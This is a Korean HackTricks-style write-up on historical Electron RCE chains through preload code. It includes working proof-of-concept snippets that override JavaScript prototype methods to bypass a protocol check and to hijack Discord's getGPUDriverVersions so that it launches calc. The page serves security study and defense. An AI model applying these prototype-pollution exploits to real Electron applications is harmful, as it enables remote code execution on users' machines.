# Electron contextIsolation에서 preload code를 통한 RCE

{{#include ../../banners/hacktricks-training.md}}

이는 preload code가 공격자가 제어하는 renderer 콘텐츠와 JavaScript 내장 객체 또는 권한이 있는 API를 공유하던 **과거의 공격 체인**입니다. context isolation이 활성화되면 preload와 페이지는 일반적으로 서로 다른 JavaScript realm을 사용하므로, 페이지에서의 prototype 재정의가 preload 객체에 자동으로 영향을 주지 않습니다. 해당 Electron/애플리케이션 버전과 bridge 구현을 기준으로 공격 체인이 성립하는지 확인하세요.<sup>[[3]](#references)</sup>

## 예제 1

[https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)의 예제<sup>[[1]](#references)</sup>

이 코드는 http(s) 링크를 기본 브라우저에서 엽니다.

![Electron contextIsolation에서 preload code를 통한 RCE - 예제 1: 이 코드는 http(s) 링크를 기본 브라우저에서 엽니다](<../../images/image (768).png>)

영향을 받은 과거 애플리케이션에서는 `file:///C:/Windows/System32/calc.exe`와 같은 로컬 파일 탐색이 OS 실행 경로에 도달할 수 있었습니다. 이를 막기 위해 `SAFE_PROTOCOLS.indexOf`를 사용하도록 설계되어 있었습니다.

따라서 공격자는 XSS 또는 임의 페이지 탐색을 통해 다음 JS 코드를 삽입할 수 있었습니다:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

`SAFE_PROTOCOLS.indexOf` 호출은 항상 1337을 반환하므로, 공격자는 보호 기능을 우회해 calc를 실행할 수 있습니다. 최종 exploit:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

원본 슬라이드에서 권한을 묻는 프롬프트 없이 프로그램을 실행하는 다른 방법도 확인하세요.<sup>[[1]](#references)</sup>

과거 Discord 대화에서는 UNC 스타일의 `file://127.0.0.1/electron/rce.jar` 로딩도 잠재적인 실행 경로로 고려했습니다. 정확한 Windows/Electron 빌드에서 접근 가능한지 검증하세요.<sup>[[2]](#references)</sup>

## 예제 2: Discord 앱 RCE

[https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)의 예제<sup>[[2]](#references)</sup>

preload 스크립트를 확인하던 중, Discord가 일부 허용된 모듈을 `DiscordNative.nativeModules.requireModule('MODULE-NAME')`로 호출할 수 있게 하는 함수를 웹 페이지에 노출한다는 사실을 발견했습니다.\
여기서는 _child_process_ 모듈처럼 RCE에 직접 사용할 수 있는 모듈은 이용할 수 없었지만, **JavaScript 내장 메서드를 재정의하고 노출된 모듈의 실행을 방해하면 RCE를 달성할 수 있는 코드를 발견했습니다.**

다음은 PoC입니다. devTools에서 "_discord_utils_"라는 모듈에 정의된 `getGPUDriverVersions` 함수를 **호출할 때 `RegExp.prototype.test`와 `Array.prototype.join`을 재정의하면**, **calc** 애플리케이션이 **팝업되는 것**을 확인할 수 있었습니다.

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

`getGPUDriverVersions` 함수는 다음과 같이 "_execa_" 라이브러리를 사용해 프로그램을 실행하려고 합니다:

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

일반적으로 _execa_는 `nvidiaSmiPath` 변수에 지정된 "_nvidia-smi.exe_"를 실행하려고 하지만, 재정의된 `RegExp.prototype.test`와 `Array.prototype.join`으로 인해 **인자가 "**_**calc**_**"로 대체됩니다. 이는 _execa**_**의 내부 처리 과정에서 발생합니다.

구체적으로는 과거 `cross-spawn` 파서의 명령어 확인 및 인자 처리 경로에 영향을 주어 인자를 대체합니다.<sup>[[4]](#references)</sup>

## References

- [1] [Electron: 컨텍스트 격리 부재 악용 - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [Discord 데스크톱 앱 RCE](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — 컨텍스트 격리](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [`node-cross-spawn` 파서 개정판 및 체인에서 사용된 정확한 경로 (36–55행)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
